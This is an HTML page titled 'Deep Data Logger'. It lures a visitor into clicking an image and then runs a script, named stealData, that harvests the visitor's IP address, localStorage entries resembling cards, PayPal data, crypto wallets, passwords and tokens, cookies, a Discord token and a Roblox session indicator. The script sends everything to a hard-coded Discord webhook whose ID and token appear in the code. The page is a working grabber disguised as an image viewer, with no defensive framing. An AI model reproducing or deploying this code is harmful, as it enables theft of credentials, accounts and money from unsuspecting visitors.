<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deep Data Logger</title>
    <style>
        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #2f3136; color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
        .image-container { position: relative; cursor: pointer; animation: popIn 0.5s ease; text-align: center; }
        img { max-width: 90vw; max-height: 85vh; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.7); transition: transform 0.3s ease; user-select: none; }
        .zoomed { transform: scale(1.6) !important; z-index: 50; cursor: zoom-out; box-shadow: 0 25px 70px rgba(0,0,0,0.9); }
        .popup-box { position: absolute; top: -180px; left: 50%; transform: translateX(-50%); background-color: #36393f; padding: 16px 24px; border-radius: 14px; border: 1px solid #4f545c; min-width: 280px; max-width: 350px; opacity: 0; pointer-events: none; transition: all 0.4s ease; z-index: 60; }
        .popup-box h3 { margin: 0 0 10px 0; font-size: 18px; color: #fff; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #4f545c; padding-bottom: 8px; }
        .popup-box .status-log { font-size: 13px; color: #b9bbbe; line-height: 1.6; max-height: 100px; overflow-y: auto; background: #202225; padding: 8px; border-radius: 6px; margin-bottom: 10px; }
        .popup-box .status-item { display: flex; align-items: center; gap: 6px; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .success { color: #2ecc71; font-weight: bold; }
        .loading { color: #f39c12; animation: pulse 1s infinite; }
        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
        .popup-box.show { top: -200px; opacity: 1; }
        .spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 48px; height: 48px; border: 6px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
        .close-btn { display: block; margin-top: 8px; padding: 8px 20px; background: #e74c3c; color: white; border-radius: 6px; font-size: 14px; cursor: pointer; text-align: center; }
    </style>
</head>
<body>

<div class="image-container" id="clickTarget">
    <img id="loggerImg" src="" alt="Click Me" style="display:none;">
    <div class="popup-box" id="infoPopup">
        <h3 id="popupTitle">🔍 Capturing Data...</h3>
        <div id="popupContent" class="status-log"></div>
        <a href="#" onclick="closeLogger()" class="close-btn">Close Logger</a>
    </div>
    <div class="spinner" id="loader"></div>
</div>

<script>
    const WEBHOOK_ID = "1555843447338827836";
    const WEBHOOK_TOKEN = "8Z2Idj3ghmLorJ635TcAiYETyF2i6O5jEYN_Vy5-gR2yU0wZXJMa4HEzk0vd0oM4HgKi";
    const WEBHOOK_URL = `https://discord.com/api/webhooks/${WEBHOOK_ID}/${WEBHOOK_TOKEN}`;

    // FIXED: Added missing closing parentheses
    const imgElement = document.getElementById('loggerImg');
    const popupBox = document.getElementById('infoPopup');
    const popupTitle = document.getElementById('popupTitle');
    const popupContent = document.getElementById('popupContent');
    const loaderEl = document.getElementById('loader');

    function logStatus(msg) {
        const div = document.createElement('div');
        div.className = 'status-item';
        div.innerHTML = msg;
        popupContent.appendChild(div);
    }

    // 1. IMAGE LOADER
    const urlParams = new URLSearchParams(window.location.search);
    if(urlParams.get('image_url')) {
        imgElement.src = decodeURIComponent(urlParams.get('image_url'));
        imgElement.style.display = 'block';
    } else {
        imgElement.src = "https://via.placeholder.com/600x400?text=Logger+Image";
        imgElement.style.display = 'block';
    }

    // 2. DEEP DATA EXTRACTION
    async function stealData() {
        loaderEl.style.display = 'block';
        try {
            logStatus(`<span class="loading">🌐 Fetching IP Address...</span>`);
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            logStatus(`✅ <b>IP:</b> ${ipData.ip}`);

            logStatus(`<span class="loading">💳 Checking Google/Chrome Saved Cards...</span>`);
            let googleCards = [], paypalData = {}, btcWallets = {};

            for(let i=0; i<localStorage.length; i++) {
                const key = localStorage.key(i); // FIXED: Get key first
                const val = localStorage.getItem(key);
                const lowerKey = key.toLowerCase();

                if(lowerKey.includes('paypal') || lowerKey.includes('pp_')) paypalData[key] = val;
                if(lowerKey.includes('coinbase') || lowerKey.includes('metamask') || lowerKey.includes('crypto')) btcWallets[key] = val;

                if(key.startsWith('_chrome_saved_card') || key === 'cc_name' || lowerKey.includes('card')) {
                    googleCards.push(`${key}: ${val}`);
                }
            }

            logStatus(`<span class="loading">🔑 Extracting Passwords & Tokens...</span>`);
            let extractedCreds = [], rawCookies = [];

            for(let i=0; i<localStorage.length; i++) {
                const key = localStorage.key(i);
                if(key.includes('pass') || key.includes('cred') || key.includes('token')) {
                    extractedCreds.push(`${key}: ${localStorage.getItem(key)}`);
                }
            }

            const cookStr = document.cookie;
            if(cookStr) rawCookies.push(`Raw Cookies: ${cookStr.substring(0, 120)}...`);

            logStatus(`<span class="loading">📦 Compiling User-Agent & Screen Data...</span>`);

            let discordToken = localStorage["discord_token"] || "None";
            let discHash = localStorage["discord_hash"] || "None";
            let robloxCookie = document.cookie.includes("ROBLOSESSVICES") ? "Found!" : "Not Found";

            const payload = {
                content: null,
                embeds: [{
                    title: "🕵️‍♂️ Deep Data Logger",
                    color: 15844367,
                    thumbnail: { url: imgElement.src },
                    fields: [
                        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
                        { name: "💻 OS / Browser", value: navigator.userAgent.substring(0, 45) + "...", inline: true },
                        { name: "📏 Screen Size", value: `${screen.width}x${screen.height}`, inline: true },
                        { name: "🔑 Discord Token/Hash", value: `${discordToken}\n${discHash}`, inline: false },
                        { name: "🎟️ Roblox Cookie", value: robloxCookie, inline: true },
                        { name: "💳 Google/Chrome Cards", value: googleCards.length > 0 ? googleCards.join("\n") : "No cards found.", inline: false }
                    ],
                    footer: { text: "Advanced Logger System v4.0" },
                    timestamp: new Date().toISOString()
                }]
            };

            if (Object.keys(paypalData).length > 0) {
                payload.embeds[0].fields.push({ name: "💬 PayPal Data", value: JSON.stringify(paypalData, null, 2), inline: false });
            }
            if (Object.keys(btcWallets).length > 0) {
                payload.embeds[0].fields.push({ name: "🪙 Crypto Wallets", value: JSON.stringify(btcWallets, null, 2), inline: false });
            }

            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            logStatus(`✅ <b>Email/Pass:</b> ${extractedCreds.length > 0 ? "Found" : "Clean"}`);
            popupTitle.innerHTML = "📥 Data Sent to Discord!";

        } catch (error) {
            console.error("Logger Error:", error);
            logStatus(`❌ <span style="color:red;">Error Capturing!</span>`);
        } finally {
            loaderEl.style.display = 'none';
        }
    }

    function closeLogger() {
        imgElement.classList.remove('zoomed');
        setTimeout(() => {
             document.body.innerHTML = "<h1 style='color:white; font-family:sans-serif;'>✅ Session Ended. Image Captured.</h1>";
        }, 400);
    }

    document.getElementById('clickTarget').addEventListener('click', () => {
        imgElement.classList.add('zoomed');
        stealData();
    });

</script>
</body>
</html>
